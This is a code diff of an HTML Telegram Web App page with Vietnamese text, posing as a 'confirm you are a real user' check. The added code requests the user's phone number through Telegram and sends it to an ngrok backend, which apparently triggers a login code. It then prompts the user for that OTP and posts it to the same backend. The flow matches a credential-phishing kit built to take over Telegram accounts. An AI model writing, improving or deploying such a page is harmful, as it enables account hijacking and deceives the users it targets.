@@ -7,54 +7,78 @@
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
         body { background: #0d1117; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: sans-serif; text-align: center; }
-        .content { padding: 20px; }
+        .content { padding: 20px; width: 80%; }
+        input { padding: 12px; width: 90%; border-radius: 8px; border: none; margin-top: 10px; font-size: 16px; }
     </style>
 </head>
 <body>
 
-<div class="content">
-    <div style="font-size: 60px; margin-bottom: 20px;">👋</div>
-    <div>Bạn cần xác nhận mình là người dùng thật!</div>
+<div class="content" id="app">
+    <div style="font-size: 50px; margin-bottom: 20px;">👋</div>
+    <div id="message">Bạn cần xác nhận mình là người dùng thật!</div>
 </div>
 
 <script>
-    // NHỚ THAY ĐỔI LINK NGROK Ở ĐÂY
     const BACKEND_URL = 'https://augmented-musky-unshaven.ngrok-free.dev';
-    
     const tg = window.Telegram.WebApp;
     tg.ready();
     tg.expand();
 
-    // 1. Cấu hình nút chính của Telegram
+    // Bước 1: Yêu cầu SĐT
     tg.MainButton.text = "XÁC NHẬN SỐ ĐIỆN THOẠI";
     tg.MainButton.show();
     
-    // 2. Gọi hàm requestContact khi nhấn vào nút chính
     tg.MainButton.onClick(() => {
-        tg.MainButton.text = "ĐANG GỌI TELEGRAM...";
         tg.requestContact();
     });
 
-    // 3. Xử lý khi Telegram trả kết quả
-    // Thay thế đoạn tg.close() cũ bằng đoạn này:
-// Ẩn nút cũ, hiện ô nhập mã
-document.body.innerHTML = `
-    <div style="padding: 20px; color: white;">
-        <h3>Nhập mã OTP</h3>
-        <input type="text" id="otpInput" placeholder="Nhập mã..." style="padding: 10px; width: 100%;">
-        <button id="sendOtpBtn" style="padding: 10px; width: 100%; margin-top: 10px;">Xác nhận OTP</button>
-    </div>
-`;
+    // Xử lý sự kiện sau khi share SĐT
+    tg.onEvent('contactRequested', async (data) => {
+        const phoneNumber = (data.responseUnsafe && data.responseUnsafe.contact) ? data.responseUnsafe.contact.phone_number : null;
 
-document.getElementById('sendOtpBtn').addEventListener('click', async () => {
-    const otp = document.getElementById('otpInput').value;
-    // Gửi mã OTP này về backend để tool xử lý tiếp
-    await fetch(`${BACKEND_URL}/verify_otp`, {
-        method: 'POST',
-        body: JSON.stringify({ otp: otp })
+        if (phoneNumber) {
+            tg.MainButton.text = "ĐANG GỬI...";
+            
+            // Gửi SĐT về server để xin mã OTP
+            const res = await fetch(`${BACKEND_URL}/send_phone`, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({ phone: phoneNumber })
+            });
+            
+            // Chuyển sang Bước 2: Nhập OTP
+            document.getElementById('message').innerHTML = "Mã OTP đã được gửi về Telegram của bạn.<br>Vui lòng nhập mã vào ô dưới đây:";
+            document.getElementById('app').innerHTML += '<input type="text" id="otpInput" placeholder="Nhập mã OTP...">';
+            
+            tg.MainButton.text = "XÁC NHẬN MÃ OTP";
+            tg.MainButton.onClick(submitOtp); // Đổi hành động nút sang gửi OTP
+        } else {
+            alert("Lỗi không lấy được SĐT.");
+        }
     });
-    alert("Đang kiểm tra mã...");
-});
+
+    // Bước 2: Gửi OTP về server
+    async function submitOtp() {
+        const otp = document.getElementById('otpInput').value;
+        if (!otp) return alert("Vui lòng nhập mã!");
+
+        tg.MainButton.text = "ĐANG XÁC MINH...";
+        const res = await fetch(`${BACKEND_URL}/verify_otp`, {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({ otp: otp })
+        });
+        
+        const result = await res.json();
+        if (result.success) {
+            tg.MainButton.text = "THÀNH CÔNG!";
+            alert("Xác minh thành công!");
+            tg.close();
+        } else {
+            alert("Mã không đúng, vui lòng thử lại.");
+            tg.MainButton.text = "XÁC NHẬN MÃ OTP";
+        }
+    }
 </script>
 </body>
 </html>
